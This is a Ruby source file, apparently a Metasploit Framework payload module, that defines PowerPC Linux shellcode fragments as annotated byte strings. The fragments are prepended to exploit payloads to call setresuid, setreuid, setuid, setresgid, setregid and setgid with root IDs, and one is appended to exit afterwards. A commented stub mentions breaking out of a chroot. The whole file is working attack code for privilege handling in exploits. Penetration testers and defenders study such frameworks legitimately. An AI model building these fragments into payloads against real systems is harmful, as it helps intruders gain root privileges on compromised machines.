#
# Linux ppc prepends
#
module Msf::Payload::Linux::Ppc::Prepends
  include Msf::Payload::Linux::Prepends

  def prepends_order
    %w[PrependSetresuid PrependSetreuid PrependSetuid PrependSetresgid PrependSetregid PrependSetgid]
  end

  def appends_order
    %w[AppendExit]
  end

  def prepends_map
    {
      # 'PrependFork' =>  "",

      # setresuid(0, 0, 0)
      'PrependSetresuid' => "\x3b\xe0\x01\xff" + #   li      r31,511                    #
        "\x7c\xa5\x2a\x78" + #   xor     r5,r5,r5                   #
        "\x7c\x84\x22\x78" + #   xor     r4,r4,r4                   #
        "\x7c\x63\x1a\x78" + #   xor     r3,r3,r3                   #
        "\x38\x1f\xfe\xa5" + #   addi    r0,r31,-347                #
        "\x44\xff\xff\x02", #   sc                                 #

      # setreuid(0, 0)
      'PrependSetreuid' => "\x3b\xe0\x01\xff" + #   li      r31,511                    #
        "\x7c\x84\x22\x78" + #   xor     r4,r4,r4                   #
        "\x7c\x63\x1a\x78" + #   xor     r3,r3,r3                   #
        "\x38\x1f\xfe\x47" + #   addi    r0,r31,-441                #
        "\x44\xff\xff\x02", #   sc                                 #

      # setuid(0)
      'PrependSetuid' => "\x3b\xe0\x01\xff" + #   li      r31,511                    #
        "\x7c\x63\x1a\x78" + #   xor     r3,r3,r3                   #
        "\x38\x1f\xfe\x18" + #   addi    r0,r31,-488                #
        "\x44\xff\xff\x02", #   sc                                 #

      # setresgid(0, 0, 0)
      'PrependSetresgid' => "\x3b\xe0\x01\xff" + #   li      r31,511                    #
        "\x7c\xa5\x2a\x78" + #   xor     r5,r5,r5                   #
        "\x7c\x84\x22\x78" + #   xor     r4,r4,r4                   #
        "\x7c\x63\x1a\x78" + #   xor     r3,r3,r3                   #
        "\x38\x1f\xfe\xab" + #   addi    r0,r31,-341                #
        "\x44\xff\xff\x02", #   sc                                 #

      # setregid(0, 0)
      'PrependSetregid' => "\x3b\xe0\x01\xff" + #   li      r31,511                    #
        "\x7c\x84\x22\x78" + #   xor     r4,r4,r4                   #
        "\x7c\x63\x1a\x78" + #   xor     r3,r3,r3                   #
        "\x38\x1f\xfe\x48" + #   addi    r0,r31,-440                #
        "\x44\xff\xff\x02", #   sc                                 #

      # setgid(0)
      'PrependSetgid' => "\x3b\xe0\x01\xff" + #   li      r31,511                    #
        "\x7c\x63\x1a\x78" + #   xor     r3,r3,r3                   #
        "\x38\x1f\xfe\x2f" + #   addi    r0,r31,-465                #
        "\x44\xff\xff\x02" #   sc                                 #

      # setreuid(0, 0) = break chroot
      # 'PrependChrootBreak' =>
    }
  end

  def appends_map
    {
      # exit(0)
      'AppendExit' => "\x3b\xe0\x01\xff" + #   li      r31,511                    #
        "\x7c\x63\x1a\x78" + #   xor     r3,r3,r3                   #
        "\x38\x1f\xfe\x02" + #   addi    r0,r31,-510                #
        "\x44\xff\xff\x02" #   sc                                 #
    }
  end
end
